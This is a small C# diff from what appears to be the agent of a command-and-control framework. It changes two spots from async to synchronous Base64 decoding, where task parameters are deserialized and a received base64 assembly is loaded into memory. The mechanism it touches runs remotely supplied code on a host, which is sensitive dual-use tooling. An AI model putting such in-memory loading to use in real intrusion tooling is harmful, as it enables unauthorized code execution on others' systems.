@@ -35,7 +35,7 @@ namespace Agent.Managers
                     LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                     if (loadCommand is not null)
                     {
-                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(loadCommand.asm);
+                        byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
                         if (buf.Length > 0)
                         {
                             this.assemblyManager.LoadPluginAsync(job.task.id, loadCommand.command, buf);
@@ -49,7 +49,7 @@ namespace Agent.Managers
                     LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                     if (command is not null)
                     {
-                        byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
+                        byte[] buf = Misc.Base64DecodeToByteArray(command.asm);
                         if (buf.Length > 0)
                         {
                             this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
